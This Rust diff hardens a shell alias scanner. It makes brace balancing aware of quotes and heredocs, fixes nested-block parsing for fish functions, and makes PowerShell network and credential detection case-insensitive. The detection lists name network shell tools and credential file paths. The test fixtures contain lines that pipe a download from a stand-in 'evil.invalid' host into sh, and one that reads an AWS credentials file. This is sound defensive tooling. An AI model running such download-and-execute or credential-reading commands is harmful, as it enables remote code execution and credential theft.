@@ -391,6 +391,231 @@ fn skip_alias_flags(rest: &str) -> &str {
 
 /// Try to parse a POSIX function (`function name() {…}`, `function name {…}`,
 /// `name() {…}`) starting at `lines[start]`, returning `(name, lines_consumed,
+/// Quote/escape/comment/heredoc-aware brace balancer (repo-0242). The old
+/// balancer counted every literal `{`/`}`, so a `}` inside a quoted string or
+/// heredoc terminated collection early and left later risky commands outside
+/// the scanned body.
+#[derive(Clone, Copy, PartialEq, Eq)]
+enum BraceDialect {
+    Posix,
+    PowerShell,
+}
+
+struct BraceBalancer {
+    dialect: BraceDialect,
+    depth: i32,
+    started: bool,
+    in_single: bool,
+    in_double: bool,
+    escaped: bool,
+    in_comment: bool,
+    /// POSIX heredoc delimiter being collected right after `<<`/`<<-`.
+    heredoc_pending: String,
+    collecting_heredoc: bool,
+    /// Active heredoc: lines are skipped until a line equal to this delimiter.
+    heredoc: Option<String>,
+    heredoc_line: String,
+    word_start: bool,
+}
+
+impl BraceBalancer {
+    fn new(dialect: BraceDialect) -> Self {
+        Self {
+            dialect,
+            depth: 0,
+            started: false,
+            in_single: false,
+            in_double: false,
+            escaped: false,
+            in_comment: false,
+            heredoc_pending: String::new(),
+            collecting_heredoc: false,
+            heredoc: None,
+            heredoc_line: String::new(),
+            word_start: true,
+        }
+    }
+
+    /// Feed one line (or fragment) plus its terminating newline state. Returns
+    /// `true` once the outermost brace pair has balanced. Body text is appended
+    /// to `body` (without the outermost opening brace).
+    fn feed(&mut self, s: &str, body: &mut String) -> bool {
+        for ch in s.chars() {
+            if self.step(ch, body) {
+                return true;
+            }
+        }
+        false
+    }
+
+    /// Feed the inter-line newline through the same lexer (comments and
+    /// heredoc terminators depend on it) and mirror it into the body.
+    fn feed_newline(&mut self, body: &mut String) -> bool {
+        self.step('\n', body)
+    }
+
+    fn step(&mut self, ch: char, body: &mut String) -> bool {
+        // Heredoc body: accumulate the current line; a line equal to the
+        // delimiter ends it. Nothing inside counts as a brace.
+        if let Some(delim) = self.heredoc.clone() {
+            if ch == '\n' {
+                let line = self.heredoc_line.trim_end_matches('\r');
+                let line = line.strip_prefix('\t').unwrap_or(line);
+                if line == delim {
+                    self.heredoc = None;
+                }
+                self.heredoc_line.clear();
+                if self.started {
+                    body.push(ch);
+                }
+                self.word_start = true;
+                return false;
+            }
+            self.heredoc_line.push(ch);
+            if self.started {
+                body.push(ch);
+            }
+            return false;
+        }
+
+        if self.in_comment {
+            if ch == '\n' {
+                self.in_comment = false;
+                self.word_start = true;
+            }
+            if self.started {
+                body.push(ch);
+            }
+            return false;
+        }
+
+        if self.in_single {
+            if ch == '\'' {
+                self.in_single = false;
+            }
+            if self.started {
+                body.push(ch);
+            }
+            self.word_start = false;
+            return false;
+        }
+
+        if self.in_double {
+            let esc = matches!(self.dialect, BraceDialect::Posix) && ch == '\\'
+                || matches!(self.dialect, BraceDialect::PowerShell) && ch == '`';
+            if self.escaped {
+                self.escaped = false;
+            } else if esc {
+                self.escaped = true;
+            } else if ch == '"' {
+                self.in_double = false;
+            }
+            if self.started {
+                body.push(ch);
+            }
+            self.word_start = false;
+            return false;
+        }
+
+        if self.escaped {
+            self.escaped = false;
+            if self.started {
+                body.push(ch);
+            }
+            self.word_start = false;
+            return false;
+        }
+
+        // POSIX heredoc delimiter collection after `<<` / `<<-`.
+        if self.collecting_heredoc {
+            match ch {
+                'a'..='z' | 'A'..='Z' | '0'..='9' | '_' | '.' => {
+                    self.heredoc_pending.push(ch);
+                }
+                '-' if !self.heredoc_pending.is_empty() => {
+                    self.heredoc_pending.push(ch);
+                }
+                '\'' | '"' | '\\' => {} // quoted delimiter: quotes not part of it
+                ' ' | '\t' | '-' if self.heredoc_pending.is_empty() => {}
+                _ => {
+                    if !self.heredoc_pending.is_empty() {
+                        self.heredoc = Some(std::mem::take(&mut self.heredoc_pending));
+                        self.heredoc_line.clear();
+                    }
+                    self.collecting_heredoc = false;
+                }
+            }
+            if self.started {
+                body.push(ch);
+            }
+            self.word_start = ch.is_whitespace();
+            return false;
+        }
+
+        match ch {
+            '\\' if matches!(self.dialect, BraceDialect::Posix) => {
+                self.escaped = true;
+                self.word_start = false;
+            }
+            '`' if matches!(self.dialect, BraceDialect::PowerShell) => {
+                self.escaped = true;
+                self.word_start = false;
+            }
+            '\'' => {
+                self.in_single = true;
+                self.word_start = false;
+            }
+            '"' => {
+                self.in_double = true;
+                self.word_start = false;
+            }
+            '#' if self.word_start => {
+                self.in_comment = true;
+            }
+            '<' if matches!(self.dialect, BraceDialect::Posix) => {
+                // Detect `<<` (with optional `-`).
+                // (Set only when the previous char was also '<'.)
+                if self.heredoc_pending.is_empty() && !self.collecting_heredoc {
+                    // Mark candidate: use a sentinel value in heredoc_pending.
+                    self.heredoc_pending.push('\0');
+                } else if self.heredoc_pending == "\0" {
+                    self.heredoc_pending.clear();
+                    self.collecting_heredoc = true;
+                }
+                self.word_start = false;
+            }
+            '{' => {
+                self.depth += 1;
+                if self.depth == 1 && !self.started {
+                    self.started = true;
+                    self.word_start = true;
+                    return false; // don't include the outermost opening brace
+                }
+                self.word_start = true;
+            }
+            '}' => {
+                self.depth -= 1;
+                self.word_start = true;
+                if self.depth == 0 {
+                    return true; // balanced
+                }
+            }
+            _ => {
+                // A `<<` candidate that turned out not to be heredoc syntax.
+                if self.heredoc_pending == "\0" {
+                    self.heredoc_pending.clear();
+                }
+                self.word_start = ch.is_whitespace()
+                    || matches!(ch, '\n' | ';' | '|' | '&' | '(' | ')' | '{' | '}');
+            }
+        }
+        if self.started {
+            body.push(ch);
+        }
+        false
+    }
+}
+
 /// body, body_parsed)`. The body accumulates until braces balance; a never-
 /// balanced (truncated) body returns `body_parsed = false`.
 fn try_parse_posix_function(lines: &[&str], start: usize) -> Option<(String, usize, String, bool)> {
@@ -438,42 +663,13 @@ fn try_parse_posix_function(lines: &[&str], start: usize) -> Option<(String, usi
         buffer.push_str(lines[idx]);
     }
 
-    // Balance braces from the first `{`.
+    // Balance braces from the first `{` with the syntax-aware balancer
+    // (repo-0242): quoted/heredoc/comment braces must not terminate early.
     let open_pos = buffer.find('{').unwrap();
-    let mut depth = 0i32;
+    let mut bal = BraceBalancer::new(BraceDialect::Posix);
     let mut body = String::new();
-    let mut started = false;
-    let mut balanced = false;
-
-    // Helper to feed a slice of chars into the balancer.
-    let feed = |s: &str, depth: &mut i32, body: &mut String, started: &mut bool| -> bool {
-        for ch in s.chars() {
-            match ch {
-                '{' => {
-                    *depth += 1;
-                    if *depth == 1 && !*started {
-                        *started = true;
-                        continue; // don't include the outermost opening brace
-                    }
-                }
-                '}' => {
-                    *depth -= 1;
-                    if *depth == 0 {
-                        return true; // balanced
-                    }
-                }
-                _ => {}
-            }
-            if *started {
-                body.push(ch);
-            }
-        }
-        false
-    };
-
-    if feed(&buffer[open_pos..], &mut depth, &mut body, &mut started) {
-        balanced = true;
-    } else {
+    let mut balanced = bal.feed(&buffer[open_pos..], &mut body);
+    if !balanced {
         // Keep pulling lines until balanced or EOF.
         let mut cur = idx;
         while !balanced {
@@ -481,8 +677,12 @@ fn try_parse_posix_function(lines: &[&str], start: usize) -> Option<(String, usi
             if cur >= lines.len() {
                 break;
             }
-            body.push('\n');
-            if feed(lines[cur], &mut depth, &mut body, &mut started) {
+            if bal.feed_newline(&mut body) {
+                balanced = true;
+                idx = cur;
+                break;
+            }
+            if bal.feed(lines[cur], &mut body) {
                 balanced = true;
             }
             idx = cur;
@@ -532,15 +732,29 @@ fn parse_fish(contents: &str, path: &Path, file_recent: bool, out: &mut Vec<Alia
             let (raw_name, _tail) = split_name(rest.trim_start());
             let name = clean_name(raw_name);
             if is_valid_name(&name) {
-                // Accumulate until a line that is exactly `end`.
+                // Accumulate until the `end` that closes THIS function
+                // (repo-0242): nested `if`/`for`/`while`/`switch`/`begin`
+                // blocks close with their own `end`, so the first bare `end`
+                // is not necessarily the function terminator.
                 let mut body = String::new();
                 let mut j = i + 1;
                 let mut closed = false;
+                let mut nesting = 0i32;
                 while j < lines.len() {
                     let bl = strip_leading(lines[j]);
-                    if bl == "end" {
-                        closed = true;
-                        break;
+                    let first_word = bl.split_whitespace().next().unwrap_or("");
+                    match first_word {
+                        "if" | "for" | "while" | "switch" | "begin" | "function" => {
+                            nesting += 1;
+                        }
+                        "end" => {
+                            if nesting == 0 {
+                                closed = true;
+                                break;
+                            }
+                            nesting -= 1;
+                        }
+                        _ => {}
                     }
                     if !body.is_empty() {
                         body.push('\n');
@@ -709,47 +923,22 @@ fn balance_ps_function(lines: &[&str], start: usize, tail: &str) -> Option<(Stri
         buffer.push_str(lines[idx]);
     }
     let open_pos = buffer.find('{').unwrap();
-    let mut depth = 0i32;
-    let mut started = false;
+    let mut bal = BraceBalancer::new(BraceDialect::PowerShell);
     let mut body = String::new();
-    let mut balanced = false;
-
-    let feed = |s: &str, depth: &mut i32, body: &mut String, started: &mut bool| -> bool {
-        for ch in s.chars() {
-            match ch {
-                '{' => {
-                    *depth += 1;
-                    if *depth == 1 && !*started {
-                        *started = true;
-                        continue;
-                    }
-                }
-                '}' => {
-                    *depth -= 1;
-                    if *depth == 0 {
-                        return true;
-                    }
-                }
-                _ => {}
-            }
-            if *started {
-                body.push(ch);
-            }
-        }
-        false
-    };
-
-    if feed(&buffer[open_pos..], &mut depth, &mut body, &mut started) {
-        balanced = true;
-    } else {
+    let mut balanced = bal.feed(&buffer[open_pos..], &mut body);
+    if !balanced {
         let mut cur = idx;
         while !balanced {
             cur += 1;
             if cur >= lines.len() {
                 break;
             }
-            body.push('\n');
-            if feed(lines[cur], &mut depth, &mut body, &mut started) {
+            if bal.feed_newline(&mut body) {
+                balanced = true;
+                idx = cur;
+                break;
+            }
+            if bal.feed(lines[cur], &mut body) {
                 balanced = true;
             }
             idx = cur;
@@ -923,7 +1112,14 @@ fn classify_entry(entry: &AliasEntry, out: &mut Vec<AliasFinding>) {
     let location = entry_location(entry);
 
     // Rule 1 — overrides a critical command (Medium). Fires on the NAME.
-    if CRITICAL_COMMANDS.contains(&entry.name.as_str()) {
+    // repo-0243: PowerShell command resolution is case-insensitive, so a
+    // function named `SUDO` shadows `sudo` just the same.
+    let is_critical = if matches!(entry.shell, AliasShell::PowerShell) {
+        CRITICAL_COMMANDS.contains(&entry.name.to_ascii_lowercase().as_str())
+    } else {
+        CRITICAL_COMMANDS.contains(&entry.name.as_str())
+    };
+    if is_critical {
         out.push(AliasFinding {
             rule_id: RuleId::AliasOverridesCriticalCommand,
             severity: Severity::Medium,
@@ -943,7 +1139,7 @@ fn classify_entry(entry: &AliasEntry, out: &mut Vec<AliasFinding>) {
     // here but still got the name-based override check above).
     if !entry.body.is_empty() {
         // Rule 2 — network call (High).
-        if let Some(tool) = body_network_tool(&entry.body) {
+        if let Some(tool) = body_network_tool(&entry.body, entry.shell) {
             out.push(AliasFinding {
                 rule_id: RuleId::AliasContainsNetworkCall,
                 severity: Severity::High,
@@ -951,12 +1147,12 @@ fn classify_entry(entry: &AliasEntry, out: &mut Vec<AliasFinding>) {
                 kind: entry.kind,
                 shell: entry.shell,
                 location: location.clone(),
-                detail: format!("body invokes `{tool}` (network call)"),
+                detail: format!("body invokes `{}` (network call)", tool),
             });
         }
 
         // Rule 3 — credential-file read (High).
-        if let Some(target) = body_reads_credential(&entry.body) {
+        if let Some(target) = body_reads_credential(&entry.body, entry.shell) {
             out.push(AliasFinding {
                 rule_id: RuleId::AliasContainsCredentialRead,
                 severity: Severity::High,
@@ -991,17 +1187,36 @@ fn classify_entry(entry: &AliasEntry, out: &mut Vec<AliasFinding>) {
 
 /// Network tools an alias body must not silently invoke. Returns the first
 /// matching tool name when the body contains it as a command word.
-fn body_network_tool(body: &str) -> Option<&'static str> {
+/// repo-0243: PowerShell resolves commands case-insensitively and adds native
+/// network cmdlets/aliases the POSIX-centric list missed.
+fn body_network_tool(body: &str, shell: AliasShell) -> Option<String> {
     const TOOLS: &[&str] = &["curl", "wget", "nc", "ncat", "netcat"];
+    const PS_TOOLS: &[&str] = &[
+        "invoke-webrequest",
+        "invoke-restmethod",
+        "iwr",
+        "irm",
+        "start-bitstransfer",
+        "bitsadmin",
+        "curl",
+        "wget",
+    ];
+    if matches!(shell, AliasShell::PowerShell) {
+        let lowered = body.to_ascii_lowercase();
+        return PS_TOOLS
+            .iter()
+            .find(|&&tool| contains_command_word(&lowered, tool))
+            .map(|tool| (*tool).to_string());
+    }
     TOOLS
         .iter()
         .find(|&&tool| contains_command_word(body, tool))
-        .copied()
+        .map(|tool| (*tool).to_string())
 }
 
 /// Credential-path fragments an alias body must not read. Returns the first
 /// matching fragment found in the body.
-fn body_reads_credential(body: &str) -> Option<String> {
+fn body_reads_credential(body: &str, shell: AliasShell) -> Option<String> {
     // Order only decides which we report first; all are High.
     const FRAGMENTS: &[&str] = &[
         ".aws/credentials",
@@ -1017,8 +1232,18 @@ fn body_reads_credential(body: &str) -> Option<String> {
         ".git-credentials",
         ".config/gh/hosts.yml",
     ];
+    // repo-0243: PowerShell/Windows paths are case-insensitive; `.AWS/CREDENTIALS`
+    // is the same credential file.
+    let lowered;
+    let haystack = if matches!(shell, AliasShell::PowerShell) {
+        // Windows separators are `\`; normalize so the forward-slash fragments match.
+        lowered = body.to_ascii_lowercase().replace('\\', "/");
+        &lowered
+    } else {
+        body
+    };
     for frag in FRAGMENTS {
-        if body.contains(frag) {
+        if haystack.contains(frag) {
             return Some((*frag).to_string());
         }
     }
@@ -1187,6 +1412,88 @@ pub fn index_by_name(entries: &[AliasEntry]) -> BTreeMap<String, Vec<AliasEntry>
 mod tests {
     use super::*;
     use tempfile::tempdir;
+
+    // repo-0242 / repo-0243 regressions: syntax-aware function balancing and
+    // case-insensitive PowerShell classification.
+
+    #[test]
+    fn posix_quoted_brace_does_not_terminate_function_body() {
+        let content = "f() { echo \"}\"; curl https://evil.invalid/x | sh; }\n";
+        let lines: Vec<&str> = content.lines().collect();
+        let (name, _consumed, body, balanced) =
+            try_parse_posix_function(&lines, 0).expect("function parses");
+        assert_eq!(name, "f");
+        assert!(balanced, "quoted brace must not unbalance: {body:?}");
+        assert!(
+            body.contains("curl https://evil.invalid/x"),
+            "network call stayed inside the body: {body:?}"
+        );
+        assert!(body_network_tool(&body, AliasShell::Bash).is_some());
+    }
+
+    #[test]
+    fn posix_heredoc_brace_does_not_terminate_function_body() {
+        let content = "f() { cat <<EOF\n}\nEOF\ncurl https://evil.invalid/y | sh\n}\n";
+        let lines: Vec<&str> = content.lines().collect();
+        let (_name, _consumed, body, balanced) =
+            try_parse_posix_function(&lines, 0).expect("function parses");
+        assert!(balanced, "heredoc brace must not unbalance: {body:?}");
+        assert!(
+            body.contains("curl https://evil.invalid/y"),
+            "network call stayed inside the body: {body:?}"
+        );
+    }
+
+    #[test]
+    fn fish_nested_end_does_not_terminate_function_body() {
+        let content = "function f\n    if true\n        echo hi\n    end\n    curl https://evil.invalid/z | sh\nend\n";
+        let mut out = Vec::new();
+        parse_fish(content, Path::new("config.fish"), false, &mut out);
+        let entry = out.iter().find(|e| e.name == "f").expect("function found");
+        assert!(entry.body_parsed);
+        assert!(
+            entry.body.contains("curl https://evil.invalid/z"),
+            "nested `end` must not truncate the body: {:?}",
+            entry.body
+        );
+    }
+
+    #[test]
+    fn powershell_classification_is_case_insensitive_and_native_aware() {
+        let mk = |name: &str, body: &str| AliasEntry {
+            name: name.to_string(),
+            body: body.to_string(),
+            kind: AliasKind::Function,
+            shell: AliasShell::PowerShell,
+            source: AliasSource::StaticFile,
+            source_path: None,
+            line: None,
+            body_parsed: true,
+        };
+        let mut out = Vec::new();
+        classify_entry(&mk("SUDO", "echo ok"), &mut out);
+        assert!(out
+            .iter()
+            .any(|f| f.rule_id == RuleId::AliasOverridesCriticalCommand));
+
+        let mut out = Vec::new();
+        classify_entry(
+            &mk("Get-Thing", "Invoke-WebRequest https://evil.invalid"),
+            &mut out,
+        );
+        assert!(out
+            .iter()
+            .any(|f| f.rule_id == RuleId::AliasContainsNetworkCall));
+
+        let mut out = Vec::new();
+        classify_entry(
+            &mk("Get-Creds", "Get-Content ~\\.AWS\\CREDENTIALS"),
+            &mut out,
+        );
+        assert!(out
+            .iter()
+            .any(|f| f.rule_id == RuleId::AliasContainsCredentialRead));
+    }
 
     #[cfg(unix)]
     struct EnvVarGuard {
